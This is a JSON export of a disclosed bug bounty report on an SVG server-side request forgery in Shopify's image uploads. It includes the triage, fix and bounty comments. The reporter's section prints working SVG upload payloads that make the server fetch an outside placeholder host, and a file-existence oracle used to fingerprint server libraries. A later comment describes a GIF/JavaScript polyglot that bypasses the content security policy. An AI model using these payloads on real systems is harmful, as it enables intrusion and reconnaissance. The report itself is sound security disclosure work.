{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2017-09-22T09:09:19.442Z", 
    "voters": [
        "sp1d3rs", 
        "rhynorater", 
        "tungpun", 
        "ruvlol", 
        "eveeez", 
        "geeknik", 
        "kieran", 
        "axolotl", 
        "luckydivino", 
        "mantis", 
        "and 12 more..."
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "500.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 223203, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2017-07-19T13:34:36.488Z", 
    "vulnerability_information": "I found an issue which seems to be regression of the following issue: https://hackerone.com/reports/97501 . It seems your input validaton is not sufficient and the file is getting processed before your implemented check for valid file types.\n\nWhen adding a new product in the store, images for the product can be uploaded. When modifying the HTTP request that is sent, an attacker can do Server Side Request Forgery. The attacker simply has to specify a filename ending in .png, but use Content-Type image/svg+xml and the file content as well an SVG file.\n\nThe following requests leads to an DNS and HTTP interaction with <EXAMPLE_SERVER>, a placeholder for any server on the Internet:\n\n```\nPOST /admin/products/9577763394/images.json HTTP/1.1\nHost: 667667.myshopify.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:52.0) Gecko/20100101 Firefox/52.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nX-CSRF-Token: ca/m3aW88KsRSpDmudAHJrJBPrXdClc4T/D88ZltUf6E0YUeKneGI5CZtDJFo6wHg+EY+Q4h0uPU8rqnmm/Ydw==\nX-Requested-With: XMLHttpRequest\nContent-Length: 671\nContent-Type: multipart/form-data; boundary=---------------------------1184233411771235065729422741\nCookie: <REDACTED>\nConnection: close\n\n-----------------------------1184233411771235065729422741\nContent-Disposition: form-data; name=\"image[attachment]\"; filename=\"NagKSvgXlink2.png\"\nContent-Type: image/svg+xml\n\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?><svg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"200\" height=\"200\"><image height=\"200\" width=\"200\" xlink:href=\"http://<EXAMPLE_SERVER>/image.jpeg\" /></svg>\n-----------------------------1184233411771235065729422741\nContent-Disposition: form-data; name=\"image[alt]\"\n\n\n-----------------------------1184233411771235065729422741--\n```\n\nAlthough the Shopify server responds with a HTTP 422 message, the interaction takes place with <EXAMPLE_SERVER>:\n\n```\nHTTP/1.1 422 Unprocessable Entity\nServer: nginx\nDate: Fri, 21 Apr 2017 11:17:02 GMT\nContent-Type: application/json; charset=utf-8\nConnection: close\nReferrer-Policy: origin-when-cross-origin\nX-Frame-Options: DENY\nX-ShopId: 19430493\nX-ShardId: 1\nX-Stats-UserId: 110274114\nCache-Control: no-cache, no-store\nSet-Cookie: request_method=POST; path=/\nContent-Security-Policy: default-src 'self' data: blob: 'unsafe-inline' 'unsafe-eval' https://* shopify-pos://*; child-src 'self' https://* shopify-pos://*; connect-src 'self' wss://* https://*; script-src https://cdn.shopify.com https://checkout.shopifycs.com https://js-agent.newrelic.com https://bam.nr-data.net https://dme0ih8comzn4.cloudfront.net https://api.stripe.com https://mpsnare.iesnare.com https://appcenter.intuit.com https://www.paypal.com https://stats.g.doubleclick.net https://www.google-analytics.com https://visitors.shopify.com https://v.shopify.com https://widget.intercom.io https://js.intercomcdn.com 'self' 'unsafe-inline' 'unsafe-eval'; upgrade-insecure-requests; report-uri /csp-report?source%5Baction%5D=create&source%5Bapp%5D=Shopify&source%5Bcontroller%5D=admin%2Fproduct_images&source%5Bsection%5D=admin&source%5Buuid%5D=834e8c11-d80b-4d00-a213-78619aebe696\nX-Content-Type-Options: nosniff\nX-Download-Options: noopen\nX-Permitted-Cross-Domain-Policies: none\nX-XSS-Protection: 1; mode=block; report=/xss-report?source%5Baction%5D=create&source%5Bapp%5D=Shopify&source%5Bcontroller%5D=admin%2Fproduct_images&source%5Bsection%5D=admin&source%5Buuid%5D=834e8c11-d80b-4d00-a213-78619aebe696\nX-Dc: ash,chi2\nX-Request-ID: 834e8c11-d80b-4d00-a213-78619aebe696\nContent-Length: 109\n\n{\"errors\":{\"image\":[\"The uploaded image is corrupt and cannot be processed. Please try a different image.\"]}}\n```\n\nThe interaction with <EXAMPLE_SERVER> for HTTP is:\n\n```\nGET /image.jpeg HTTP/1.0\nHost: <EXAMPLE_SERVER>\nAccept-Encoding: gzip \n```\n\nTo further analyse the issue, let's only talk about the SVG file content in the request:\n\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<svg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"200\" height=\"200\">\n<image height=\"200\" width=\"200\" xlink:href=\"http://<EXAMPLE_SERVER>/image.jpeg\" />\n</svg>\n```\n\n\nA couple of facts:\n- When changing the `http://<EXAMPLE_SERVER>/image.jpeg` part to other protocols, only `http://` and `ftp://` lead to interaction with a server on the Internet. No other protocol on the following list does: https://www.w3.org/wiki/UriSchemes . \n- I tried to connect with the HTTP and FTP protocol to all 65535 TCP ports on my server. Shopify seems to have outbound filters on only one TCP port, 113. On all other ports I got a TCP SYN packet with both protocols. Often companies detect this kind of port scan from their network hosts, I don't know if you did.\n- The parser doesn't mind a static entity:\n\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<!DOCTYPE testingxxe [ <!ENTITY xml \"eXtensible Markup Language\"> ]>\n<svg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"200\" height=\"200\">\n<image height=\"30\" width=\"30\" xlink:href=\"http://<EXAMPLE_SERVER>/image.jpg\" />\n<text x=\"0\" y=\"20\" font-size=\"20\">&xml;</text>\n</svg>\n```\n- The \"a billion laughs\" attack - see https://en.wikipedia.org/wiki/Billion_laughs - is probably possible as static entities are allowed, but DoS is not in the scope of your bug bounty program.\n- However, the parser *doesn't* like SYSTEM Entities, we can *not* specify a different DTD file, add SYSTEM entities or any other XXE attack.\n\nBut we can use two image references and as long as the first URL returns a valid image, the second one is requested as well:\n\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<svg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"200\" height=\"200\">\n<image height=\"30\" width=\"30\" xlink:href=\"http://<EXAMPLE_SERVER>:81/example.png\" />\n<image height=\"30\" width=\"30\" xlink:href=\"http://<EXAMPLE_SERVER>:999/example.png\" />\n<text x=\"0\" y=\"20\" font-size=\"20\">test</text>\n</svg>\n```\n\nThis results in a Is-Picture-Present-Oracle. By sending a local path first we can find out if a file that includes a picture is present on the file system. Because we get an interaction for the following SVG, we know the picture /lib/plymouth/ubuntu_logo.png is present on the system (this does *not* work with non-image files like /etc/passwd):\n\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>\n<svg xmlns:svg=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"200\" height=\"200\">\n<image height=\"30\" width=\"30\" xlink:href=\"/lib/plymouth/ubuntu_logo.png\" />\n<image height=\"30\" width=\"30\" xlink:href=\"http://<EXAMPLE_SERVER>:999/example.png\" />\n<text x=\"0\" y=\"20\" font-size=\"20\">test</text>\n</svg>\n```\n\nThe following pictures allow us to fingerprint the versions of libraries installed on your server (these three files are present on your servers):\n- /usr/share/doc/libpng12-dev/examples/pngtest.png (you have libpng12-dev installed, etc.)\n- /usr/share/doc/libfreetype6/tutorial/metrics.png \n- /usr/share/doc/libexpat1-dev/expat.html/expat.png\n\n", 
    "activity_page_count": 1, 
    "severity": {
        "rating": "low", 
        "author_type": "User"
    }, 
    "title": "SVG Server Side Request Forgery (SSRF)", 
    "is_member_of_team?": null, 
    "vote_count": 22, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": null, 
    "state": "Closed", 
    "cve_ids": [], 
    "activity_page_number": 1, 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$500", 
    "singular_disclosure_disabled": true, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2017-05-03T15:20:54.175Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-03T15:20:54.175Z", 
            "actor": {
                "username": "hackerjuan", 
                "url": "/hackerjuan", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/072/324/b07d4ad408ec68efa0bf405fec25916aa3e1a147_medium.jpeg?1519416061"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "Thank you for your report. Our engineering team is investigating the issue.\n\n", 
            "markdown_message": "<p>Thank you for your report. Our engineering team is investigating the issue.</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 1651636, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-05-03T18:43:36.002Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-05-03T18:43:36.002Z", 
            "actor": {
                "username": "floyd", 
                "url": "/floyd", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/111/469/9d71cd0b557cd79d3a8d37809be8a2ca2651ba7b_medium.jpeg?1492961124"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "As I was testing again today, I would like to add some more information to this bug report, although some of it might be separate issues, but still related to the file upload. Let me know if you want me to open a separate bug report for any of them. The following issues are all related to the image avatar upload (not the product image upload I tested before):\n\n1. The image avatar upload for profiles is also prone to the described image upload SSRF issue.\n\n2. When Uploading a file with file extension .png, content-type image/png and file content of a TIFF file, the server converts the image with GraphicsMagick. When the resulting file is downloaded again, it includes a comment in the TIFF file content. GraphicsMagick leaks the local path and the exact version of GraphicsMagick. The following string is part of the file content:\n\n/tmp/gmi7JIsA GraphicsMagick 1.4 snapshot-20160531 Q8 http://www.GraphicsMagick.org/\n\n3. Content-Type mismatch are pretty common. Uploading a tiff image content as image/png works and the response includes \"Content-Type: image/png\", but the file that is actually downloaded is a tiff image.\n\n4. A generic CSP bypass is possible as https://cdn.shopify.com is whitelisted in the CSP header and it is possible to upload a file that is a valid GIF image and a valid JavaScript. Such a file is described on http://www.thinkfu.com/blog/gifjavascript-polyglots . I succesfully uploaded that file and although GraphicsMagick will transform it, it stays a valid GIF image and JavaScript file. The file on the CDN domain can be found here: https://cdn.shopify.com/s/files/1/1943/0493/users/1DwldMePolyGifCspBypass0aLr.gif?v=1493836174\n", 
            "markdown_message": "<p>As I was testing again today, I would like to add some more information to this bug report, although some of it might be separate issues, but still related to the file upload. Let me know if you want me to open a separate bug report for any of them. The following issues are all related to the image avatar upload (not the product image upload I tested before):</p>\n\n<ol>\n<li><p>The image avatar upload for profiles is also prone to the described image upload SSRF issue.</p></li>\n<li><p>When Uploading a file with file extension .png, content-type image/png and file content of a TIFF file, the server converts the image with GraphicsMagick. When the resulting file is downloaded again, it includes a comment in the TIFF file content. GraphicsMagick leaks the local path and the exact version of GraphicsMagick. The following string is part of the file content:</p></li>\n</ol>\n\n<p>/tmp/gmi7JIsA GraphicsMagick 1.4 snapshot-20160531 Q8 <a title=\"http://www.graphicsmagick.org/\" href=\"/redirect?signature=904dbe33c9bda2f638f3f62b93f3302b5226319a&amp;url=http%3A%2F%2Fwww.graphicsmagick.org%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://www.graphicsmagick.org/</span><i class=\"icon-external-link\"></i></a></p>\n\n<ol>\n<li><p>Content-Type mismatch are pretty common. Uploading a tiff image content as image/png works and the response includes &quot;Content-Type: image/png&quot;, but the file that is actually downloaded is a tiff image.</p></li>\n<li><p>A generic CSP bypass is possible as <a title=\"https://cdn.shopify.com\" href=\"/redirect?signature=299111b3bfee0c793465877d28db79179d1fa439&amp;url=https%3A%2F%2Fcdn.shopify.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://cdn.shopify.com</span><i class=\"icon-external-link\"></i></a> is whitelisted in the CSP header and it is possible to upload a file that is a valid GIF image and a valid JavaScript. Such a file is described on <a title=\"http://www.thinkfu.com/blog/gifjavascript-polyglots\" href=\"/redirect?signature=0ec4f317dfb3e228499e0a7ce8a570f041b1dde2&amp;url=http%3A%2F%2Fwww.thinkfu.com%2Fblog%2Fgifjavascript-polyglots\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://www.thinkfu.com/blog/gifjavascript-polyglots</span><i class=\"icon-external-link\"></i></a> . I succesfully uploaded that file and although GraphicsMagick will transform it, it stays a valid GIF image and JavaScript file. The file on the CDN domain can be found here: <a title=\"https://cdn.shopify.com/s/files/1/1943/0493/users/1DwldMePolyGifCspBypass0aLr.gif?v=1493836174\" href=\"/redirect?signature=8fb0cbecf12d23699e7214ca028965103481072b&amp;url=https%3A%2F%2Fcdn.shopify.com%2Fs%2Ffiles%2F1%2F1943%2F0493%2Fusers%2F1DwldMePolyGifCspBypass0aLr.gif%3Fv%3D1493836174\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://cdn.shopify.com/s/files/1/1943/0493/users/1DwldMePolyGifCspBypass0aLr.gif?v=1493836174</span><i class=\"icon-external-link\"></i></a></p></li>\n</ol>\n", 
            "type": "Activities::Comment", 
            "id": 1652142, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-14T17:34:51.964Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-14T17:34:51.964Z", 
            "actor": {
                "username": "floyd", 
                "url": "/floyd", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/111/469/9d71cd0b557cd79d3a8d37809be8a2ca2651ba7b_medium.jpeg?1492961124"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "Any updates on this one?", 
            "markdown_message": "<p>Any updates on this one?</p>\n", 
            "type": "Activities::Comment", 
            "id": 1755882, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "floyd", 
                "url": "/floyd"
            }, 
            "created_at": "2017-06-23T21:21:30.232Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-23T21:21:30.232Z", 
            "actor": {
                "username": "hackerjuan", 
                "url": "/hackerjuan", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/072/324/b07d4ad408ec68efa0bf405fec25916aa3e1a147_medium.jpeg?1519416061"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "Thank you again for your report! We have recently deployed a fix for this issue.\n\nOur next round of bounty decisions will take place next week, so we will be in touch with you again soon.", 
            "markdown_message": "<p>Thank you again for your report! We have recently deployed a fix for this issue.</p>\n\n<p>Our next round of bounty decisions will take place next week, so we will be in touch with you again soon.</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 1777827, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2017-06-27T13:51:41.907Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-27T13:51:41.907Z", 
            "actor": {
                "url": "/shopify", 
                "profile": {
                    "name": "Shopify"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/382/30421c25f4a7b03ec3250e36efb64f7291402806_medium.jpg?1532728703"
                }
            }, 
            "team_handle": "shopify", 
            "bonus_amount": "0.0", 
            "bounty_amount": "500.0", 
            "collaborator": {
                "username": "floyd", 
                "url": "/floyd"
            }, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BountyAwarded", 
            "id": 1784399, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-06-27T13:51:55.288Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-06-27T13:51:55.288Z", 
            "actor": {
                "username": "francoischagnon", 
                "url": "/francoischagnon", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/168/3b5130025fbf90eaeb1c9234baa340dfead68f44_medium.jpg?1429126005"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "Hi @floyd, thanks for reporting this issue. We've fixed the issue by adding a mime type validation before parsing an image with graphicks magic. We're awarding 500$ since this is consistent with how we rewarded similar issues in the past.", 
            "markdown_message": "<p>Hi <a href=\"/floyd\">@floyd</a>, thanks for reporting this issue. We&#39;ve fixed the issue by adding a mime type validation before parsing an image with graphicks magic. We&#39;re awarding 500$ since this is consistent with how we rewarded similar issues in the past.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1784400, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-07-04T19:36:17.930Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-07-04T19:36:17.930Z", 
            "actor": {
                "username": "floyd", 
                "url": "/floyd", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/111/469/9d71cd0b557cd79d3a8d37809be8a2ca2651ba7b_medium.jpeg?1492961124"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "Thanks for the bug bounty. I can confirm the issue is fixed.", 
            "markdown_message": "<p>Thanks for the bug bounty. I can confirm the issue is fixed.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1802573, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-07-19T13:34:36.504Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-07-19T13:34:36.504Z", 
            "actor": {
                "username": "clayton", 
                "url": "/clayton", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/166/6d366b567e9fef1c476c1505c0016e3031a74a34_medium.jpg?1493127129"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1849722, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-09-22T09:09:19.472Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-09-22T09:09:19.472Z", 
            "actor": {
                "username": "floyd", 
                "url": "/floyd", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/111/469/9d71cd0b557cd79d3a8d37809be8a2ca2651ba7b_medium.jpeg?1492961124"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 2013732, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-09-22T09:09:19.550Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-09-22T09:09:19.550Z", 
            "actor": {
                "username": "floyd", 
                "url": "/floyd", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/111/469/9d71cd0b557cd79d3a8d37809be8a2ca2651ba7b_medium.jpeg?1492961124"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 2013733, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "reporter": {
        "username": "floyd", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/floyd", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/111/469/01e834f3c392ee29cf4e8619a330828a7759ee1e_small.jpeg?1492961124"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 68, 
        "name": "Server-Side Request Forgery (SSRF)"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "disclosed_at": "2017-09-22T09:09:19.529Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/223203", 
    "created_at": "2017-04-23T14:43:15.224Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>I found an issue which seems to be regression of the following issue: <a title=\"https://hackerone.com/reports/97501\" href=\"https://hackerone.com/reports/97501\">https://hackerone.com/reports/97501</a> . It seems your input validaton is not sufficient and the file is getting processed before your implemented check for valid file types.</p>\n\n<p>When adding a new product in the store, images for the product can be uploaded. When modifying the HTTP request that is sent, an attacker can do Server Side Request Forgery. The attacker simply has to specify a filename ending in .png, but use Content-Type image/svg+xml and the file content as well an SVG file.</p>\n\n<p>The following requests leads to an DNS and HTTP interaction with &lt;EXAMPLE_SERVER&gt;, a placeholder for any server on the Internet:</p>\n<pre class=\"highlight plaintext\"><code>POST /admin/products/9577763394/images.json HTTP/1.1\nHost: 667667.myshopify.com\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:52.0) Gecko/20100101 Firefox/52.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nX-CSRF-Token: ca/m3aW88KsRSpDmudAHJrJBPrXdClc4T/D88ZltUf6E0YUeKneGI5CZtDJFo6wHg+EY+Q4h0uPU8rqnmm/Ydw==\nX-Requested-With: XMLHttpRequest\nContent-Length: 671\nContent-Type: multipart/form-data; boundary=---------------------------1184233411771235065729422741\nCookie: &lt;REDACTED&gt;\nConnection: close\n\n-----------------------------1184233411771235065729422741\nContent-Disposition: form-data; name=&quot;image[attachment]&quot;; filename=&quot;NagKSvgXlink2.png&quot;\nContent-Type: image/svg+xml\n\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;&lt;svg xmlns:svg=&quot;http://www.w3.org/2000/svg&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; width=&quot;200&quot; height=&quot;200&quot;&gt;&lt;image height=&quot;200&quot; width=&quot;200&quot; xlink:href=&quot;http://&lt;EXAMPLE_SERVER&gt;/image.jpeg&quot; /&gt;&lt;/svg&gt;\n-----------------------------1184233411771235065729422741\nContent-Disposition: form-data; name=&quot;image[alt]&quot;\n\n\n-----------------------------1184233411771235065729422741--\n</code></pre>\n<p>Although the Shopify server responds with a HTTP 422 message, the interaction takes place with &lt;EXAMPLE_SERVER&gt;:</p>\n<pre class=\"highlight plaintext\"><code>HTTP/1.1 422 Unprocessable Entity\nServer: nginx\nDate: Fri, 21 Apr 2017 11:17:02 GMT\nContent-Type: application/json; charset=utf-8\nConnection: close\nReferrer-Policy: origin-when-cross-origin\nX-Frame-Options: DENY\nX-ShopId: 19430493\nX-ShardId: 1\nX-Stats-UserId: 110274114\nCache-Control: no-cache, no-store\nSet-Cookie: request_method=POST; path=/\nContent-Security-Policy: default-src &#39;self&#39; data: blob: &#39;unsafe-inline&#39; &#39;unsafe-eval&#39; https://* shopify-pos://*; child-src &#39;self&#39; https://* shopify-pos://*; connect-src &#39;self&#39; wss://* https://*; script-src https://cdn.shopify.com https://checkout.shopifycs.com https://js-agent.newrelic.com https://bam.nr-data.net https://dme0ih8comzn4.cloudfront.net https://api.stripe.com https://mpsnare.iesnare.com https://appcenter.intuit.com https://www.paypal.com https://stats.g.doubleclick.net https://www.google-analytics.com https://visitors.shopify.com https://v.shopify.com https://widget.intercom.io https://js.intercomcdn.com &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;; upgrade-insecure-requests; report-uri /csp-report?source%5Baction%5D=create&amp;source%5Bapp%5D=Shopify&amp;source%5Bcontroller%5D=admin%2Fproduct_images&amp;source%5Bsection%5D=admin&amp;source%5Buuid%5D=834e8c11-d80b-4d00-a213-78619aebe696\nX-Content-Type-Options: nosniff\nX-Download-Options: noopen\nX-Permitted-Cross-Domain-Policies: none\nX-XSS-Protection: 1; mode=block; report=/xss-report?source%5Baction%5D=create&amp;source%5Bapp%5D=Shopify&amp;source%5Bcontroller%5D=admin%2Fproduct_images&amp;source%5Bsection%5D=admin&amp;source%5Buuid%5D=834e8c11-d80b-4d00-a213-78619aebe696\nX-Dc: ash,chi2\nX-Request-ID: 834e8c11-d80b-4d00-a213-78619aebe696\nContent-Length: 109\n\n{&quot;errors&quot;:{&quot;image&quot;:[&quot;The uploaded image is corrupt and cannot be processed. Please try a different image.&quot;]}}\n</code></pre>\n<p>The interaction with &lt;EXAMPLE_SERVER&gt; for HTTP is:</p>\n<pre class=\"highlight plaintext\"><code>GET /image.jpeg HTTP/1.0\nHost: &lt;EXAMPLE_SERVER&gt;\nAccept-Encoding: gzip \n</code></pre>\n<p>To further analyse the issue, let&#39;s only talk about the SVG file content in the request:</p>\n<pre class=\"highlight xml\"><code><span class=\"cp\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;</span>\n<span class=\"nt\">&lt;svg</span> <span class=\"na\">xmlns:svg=</span><span class=\"s\">&quot;http://www.w3.org/2000/svg&quot;</span> <span class=\"na\">xmlns=</span><span class=\"s\">&quot;http://www.w3.org/2000/svg&quot;</span> <span class=\"na\">xmlns:xlink=</span><span class=\"s\">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class=\"na\">width=</span><span class=\"s\">&quot;200&quot;</span> <span class=\"na\">height=</span><span class=\"s\">&quot;200&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;image</span> <span class=\"na\">height=</span><span class=\"s\">&quot;200&quot;</span> <span class=\"na\">width=</span><span class=\"s\">&quot;200&quot;</span> <span class=\"na\">xlink:href=</span><span class=\"s\">&quot;http://&lt;EXAMPLE_SERVER&gt;/image.jpeg&quot;</span> <span class=\"nt\">/&gt;</span>\n<span class=\"nt\">&lt;/svg&gt;</span>\n</code></pre>\n<p>A couple of facts:</p>\n\n<ul>\n<li>When changing the <code>http://&lt;EXAMPLE_SERVER&gt;/image.jpeg</code> part to other protocols, only <code>http://</code> and <code>ftp://</code> lead to interaction with a server on the Internet. No other protocol on the following list does: <a title=\"https://www.w3.org/wiki/UriSchemes\" href=\"/redirect?signature=0e590af50fea9bfafd0a225f0ec8c02d10f7768a&amp;url=https%3A%2F%2Fwww.w3.org%2Fwiki%2FUriSchemes\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.w3.org/wiki/UriSchemes</span><i class=\"icon-external-link\"></i></a> . </li>\n<li>I tried to connect with the HTTP and FTP protocol to all 65535 TCP ports on my server. Shopify seems to have outbound filters on only one TCP port, 113. On all other ports I got a TCP SYN packet with both protocols. Often companies detect this kind of port scan from their network hosts, I don&#39;t know if you did.</li>\n<li>The parser doesn&#39;t mind a static entity:</li>\n</ul>\n<pre class=\"highlight xml\"><code><span class=\"cp\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;no&quot;?&gt;</span>\n<span class=\"cp\">&lt;!DOCTYPE testingxxe [ &lt;!ENTITY xml &quot;eXtensible Markup Language&quot;&gt;</span> ]&gt;\n<span class=\"nt\">&lt;svg</span> <span class=\"na\">xmlns:svg=</span><span class=\"s\">&quot;http://www.w3.org/2000/svg&quot;</span> <span class=\"na\">xmlns=</span><span class=\"s\">&quot;http://www.w3.org/2000/svg&quot;</span> <span class=\"na\">xmlns:xlink=</span><span class=\"s\">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class=\"na\">width=</span><span class=\"s\">&quot;200&quot;</span> <span class=\"na\">height=</span><span class=\"s\">&quot;200&quot;</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;image</span> <span class=\"na\">height=</span><span class=\"s\">&quot;30&quot;</span> <span class=\"na\">width=</span><span class=\"s\">&quot;30&quot;</span> <span class=\"na\">xlink:href=</span><span class=\"s\">&quot;http://&lt;EXAMPLE_SERVER&gt;/image.jpg&quot;</span> <span class=\"nt\">/&gt;</span>\n<span class=\"nt\">&lt;text</span> <span class=\"na\">x=</span><span class=\"s\">&quot;0&quot;</span> <span class=\"na\">y=</span><span class=\"s\">&quot;20&quot;</span> <span class=\"na\">font-size=</span><span class=\"s\">&quot;20&quot;</span><span class=\"nt\">&gt;</span><span class=\"ni\">&amp;xml;</span><span class=\"nt\">&lt;/text&gt;</span>\n<span 